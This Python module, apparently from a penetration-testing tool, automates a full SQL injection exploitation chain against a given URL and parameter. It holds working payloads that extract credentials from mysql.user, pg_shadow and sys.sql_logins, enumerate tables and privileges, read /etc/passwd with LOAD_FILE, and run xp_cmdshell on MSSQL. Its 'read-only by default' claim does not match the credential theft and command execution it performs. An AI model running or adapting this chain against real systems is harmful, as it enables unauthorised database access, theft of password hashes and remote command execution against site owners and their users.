"""
Automated Exploitation Chain Orchestrator

Provides a full automated exploitation pipeline for confirmed SQL injection
vulnerabilities.  All operations are safe (read-only) by default.
"""

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import requests

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class ExploitationResult:
    """Full results from an automated exploitation chain run."""
    sqli_confirmed: bool = False
    database_type: str = "unknown"
    db_version: str = ""
    credentials_extracted: List[Dict[str, str]] = field(default_factory=list)
    privilege_level: str = "unknown"
    tables_enumerated: List[str] = field(default_factory=list)
    columns_enumerated: Dict[str, List[str]] = field(default_factory=dict)
    rce_achieved: bool = False
    file_read_achieved: bool = False
    persistence_established: bool = False
    cloud_escape_risk: str = "INFO"
    impact_score: int = 0  # 0-100
    steps_completed: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    raw_evidence: Dict[str, Any] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Exploitation Chain Orchestrator
# ---------------------------------------------------------------------------

class ExploitationChainOrchestrator:
    """
    Full automated exploitation pipeline for SQL injection vulnerabilities.

    Pipeline steps
    --------------
    1. Confirm SQLi vulnerability
    2. Fingerprint database
    3. Extract database credentials
    4. Enumerate users and privileges
    5. Attempt privilege escalation
    6. Search for file write / upload capabilities
    7. If possible: demonstrate webshell placement (safe-mode: skipped)
    8. Establish persistence (create backdoor account) – safe-mode: skipped
    9. Generate comprehensive impact report
    """

    # Fingerprint probes: payload -> expected_pattern mapping
    _DB_FINGERPRINT_PROBES: Dict[str, Dict[str, str]] = {
        "mysql": {
            "payload": "' UNION SELECT @@version,NULL-- -",
            "pattern": r"\d+\.\d+\.\d+-\w*",
        },
        "postgresql": {
            "payload": "' UNION SELECT version(),NULL-- -",
            "pattern": r"PostgreSQL \d+\.\d+",
        },
        "mssql": {
            "payload": "' UNION SELECT @@version,NULL-- -",
            "pattern": r"Microsoft SQL Server",
        },
        "oracle": {
            "payload": "' UNION SELECT banner,NULL FROM v$version-- -",
            "pattern": r"Oracle Database",
        },
        "sqlite": {
            "payload": "' UNION SELECT sqlite_version(),NULL-- -",
            "pattern": r"\d+\.\d+\.\d+",
        },
    }

    _PRIV_PAYLOADS: Dict[str, str] = {
        "mysql": "' UNION SELECT user(),NULL-- -",
        "postgresql": "' UNION SELECT current_user,NULL-- -",
        "mssql": "' UNION SELECT SYSTEM_USER,NULL-- -",
        "oracle": "' UNION SELECT USER,NULL FROM dual-- -",
    }

    _TABLE_ENUM_PAYLOADS: Dict[str, str] = {
        "mysql": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
        "postgresql": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -",
        "mssql": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -",
        "oracle": "' UNION SELECT table_name,NULL FROM user_tables-- -",
    }

    _FILE_READ_PAYLOADS: Dict[str, str] = {
        "mysql": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -",
        "mssql": "'; EXEC xp_cmdshell 'type C:\\Windows\\win.ini'-- -",
    }

    def __init__(
        self,
        config: Optional[Dict[str, Any]] = None,
        safe_mode: bool = True,
    ) -> None:
        self.config = config or {}
        self.safe_mode = safe_mode

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------

    def execute_full_chain(
        self,
        target_url: str,
        parameter_name: str,
        sqli_vulnerability: Optional[Dict[str, Any]] = None,
    ) -> ExploitationResult:
        """
        Execute the full exploitation chain against a confirmed (or suspected)
        SQL injection point.

        Args:
            target_url: Target URL.
            parameter_name: Vulnerable parameter name.
            sqli_vulnerability: Optional pre-confirmed vulnerability dict.
                                 If provided, step 1 is skipped.

        Returns:
            ExploitationResult with all findings.
        """
        result = ExploitationResult()

        # Step 1 – Confirm SQLi
        result = self._step1_confirm(result, target_url, parameter_name, sqli_vulnerability)
        if not result.sqli_confirmed:
            result.recommendations.append(
                "Vulnerability could not be confirmed – verify manually."
            )
            return result

        # Step 2 – Fingerprint database
        result = self._step2_fingerprint(result, target_url, parameter_name)

        # Step 3 – Extract credentials
        result = self._step3_extract_credentials(result, target_url, parameter_name)

        # Step 4 – Enumerate users and privileges
        result = self._step4_enumerate_privileges(result, target_url, parameter_name)

        # Step 5 – Privilege escalation check
        result = self._step5_privilege_escalation(result, target_url, parameter_name)

        # Step 6 – File capabilities
        result = self._step6_file_capabilities(result, target_url, parameter_name)

        # Steps 7 & 8 are skipped in safe mode
        if not self.safe_mode:
            result.steps_completed.append("step7_webshell: skipped (not implemented safely)")
            result.steps_completed.append("step8_persistence: skipped (not implemented safely)")

        # Step 9 – Impact report
        result = self._step9_impact_report(result)

        return result

    # ------------------------------------------------------------------
    # Pipeline steps
    # ------------------------------------------------------------------

    def _step1_confirm(
        self,
        result: ExploitationResult,
        url: str,
        param: str,
        vuln: Optional[Dict[str, Any]],
    ) -> ExploitationResult:
        if vuln and vuln.get("confirmed"):
            result.sqli_confirmed = True
            result.steps_completed.append("step1_confirm: pre-confirmed")
            return result

        # Boolean confirmation
        true_resp = self._send(url, param, "' AND '1'='1")
        false_resp = self._send(url, param, "' AND '1'='2")
        if true_resp and false_resp and len(true_resp) != len(false_resp):
            result.sqli_confirmed = True
            result.raw_evidence["boolean_confirmation"] = {
                "true_len": len(true_resp),
                "false_len": len(false_resp),
            }
            result.steps_completed.append("step1_confirm: boolean confirmed")
        else:
            result.steps_completed.append("step1_confirm: could not confirm")

        return result

    def _step2_fingerprint(
        self, result: ExploitationResult, url: str, param: str
    ) -> ExploitationResult:
        import re as _re

        for db_type, probe in self._DB_FINGERPRINT_PROBES.items():
            body = self._send(url, param, probe["payload"])
            if body and _re.search(probe["pattern"], body, _re.IGNORECASE):
                result.database_type = db_type
                match = _re.search(probe["pattern"], body, _re.IGNORECASE)
                result.db_version = match.group(0) if match else ""
                result.steps_completed.append(f"step2_fingerprint: {db_type}")
                result.raw_evidence["db_fingerprint"] = {
                    "db_type": db_type,
                    "version_hint": result.db_version,
                }
                break
        else:
            result.steps_completed.append("step2_fingerprint: undetermined")

        return result

    def _step3_extract_credentials(
        self, result: ExploitationResult, url: str, param: str
    ) -> ExploitationResult:
        import re as _re

        credential_payloads = {
            "mysql": [
                "' UNION SELECT user,password FROM mysql.user-- -",
                "' UNION SELECT username,password FROM users-- -",
            ],
            "postgresql": [
                "' UNION SELECT usename,passwd FROM pg_shadow-- -",
                "' UNION SELECT username,password FROM users-- -",
            ],
            "mssql": [
                "' UNION SELECT name,password_hash FROM sys.sql_logins-- -",
            ],
            "default": [
                "' UNION SELECT username,password FROM users-- -",
                "' UNION SELECT user,pass FROM accounts-- -",
            ],
        }
        payloads = credential_payloads.get(
            result.database_type, credential_payloads["default"]
        )

        for payload in payloads:
            body = self._send(url, param, payload)
            if body:
                # Naive credential extraction – look for hash-like patterns
                hashes = _re.findall(
                    r"([a-zA-Z0-9_\-\.@]+):([0-9a-fA-F]{32,64})", body
                )
                for username, pw_hash in hashes[:10]:
                    result.credentials_extracted.append(
                        {"username": username, "hash": pw_hash}
                    )

        result.steps_completed.append(
            f"step3_credentials: {len(result.credentials_extracted)} found"
        )
        return result

    def _step4_enumerate_privileges(
        self, result: ExploitationResult, url: str, param: str
    ) -> ExploitationResult:
        payload = self._PRIV_PAYLOADS.get(result.database_type, "' UNION SELECT current_user,NULL-- -")
        body = self._send(url, param, payload)
        if body:
            import re as _re

            match = _re.search(r"([a-zA-Z0-9_@\.\-]+)", body)
            if match:
                result.privilege_level = match.group(1)

        # Table enumeration
        table_payload = self._TABLE_ENUM_PAYLOADS.get(result.database_type, "")
        if table_payload:
            body = self._send(url, param, table_payload)
            if body:
                import re as _re

                tables = _re.findall(r"\b([a-zA-Z_][a-zA-Z0-9_]{2,})\b", body)
                result.tables_enumerated = list(set(tables))[:20]

        result.steps_completed.append(
            f"step4_privileges: level={result.privilege_level}, tables={len(result.tables_enumerated)}"
        )
        return result

    def _step5_privilege_escalation(
        self, result: ExploitationResult, url: str, param: str
    ) -> ExploitationResult:
        escalation_payloads: Dict[str, List[str]] = {
            "mysql": [
                "' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges-- -",
            ],
            "mssql": [
                "' UNION SELECT name,type_desc FROM sys.server_principals WHERE type='S'-- -",
            ],
        }
        for payload in escalation_payloads.get(result.database_type, []):
            body = self._send(url, param, payload)
            if body and ("SUPER" in body or "sysadmin" in body or "DBA" in body):
                result.privilege_level = "admin"
                result.steps_completed.append("step5_escalation: elevated to admin")
                return result

        result.steps_completed.append("step5_escalation: no escalation found")
        return result

    def _step6_file_capabilities(
        self, result: ExploitationResult, url: str, param: str
    ) -> ExploitationResult:
        payload = self._FILE_READ_PAYLOADS.get(result.database_type, "")
        if payload:
            body = self._send(url, param, payload)
            if body and ("root:" in body or "[boot loader]" in body.lower()):
                result.file_read_achieved = True

        result.steps_completed.append(
            f"step6_file_capabilities: file_read={result.file_read_achieved}"
        )
        return result

    def _step9_impact_report(self, result: ExploitationResult) -> ExploitationResult:
        score = 0

        if result.sqli_confirmed:
            score += 20
        if result.database_type != "unknown":
            score += 10
        score += min(len(result.credentials_extracted) * 5, 20)
        if result.privilege_level in ("admin", "dba", "system", "sa", "root"):
            score += 25
        if result.file_read_achieved:
            score += 15
        if result.rce_achieved:
            score += 30
        if result.persistence_established:
            score += 20

        result.impact_score = min(score, 100)
        result.steps_completed.append(f"step9_impact_report: score={result.impact_score}")

        result.recommendations = [
            "Use parameterised queries / prepared statements.",
            "Apply principle of least privilege to database accounts.",
            "Deploy a WAF to filter injection patterns.",
            "Enable SQL query logging and alerting.",
            "Regularly audit database user permissions.",
        ]

        if result.file_read_achieved:
            result.recommendations.insert(
                0, "URGENT: Revoke FILE privilege from database accounts."
            )

        return result

    # ------------------------------------------------------------------
    # HTTP helper
    # ------------------------------------------------------------------

    def _send(self, url: str, param: str, payload: str) -> Optional[str]:
        """Send a GET request with the payload and return the response body."""
        try:
            resp = requests.get(
                url,
                params={param: payload},
                timeout=self.config.get("timeout", 10),
                allow_redirects=False,
            )
            return resp.text
        except Exception as exc:
            logger.debug("Exploitation chain request failed: %s", exc)
            return None
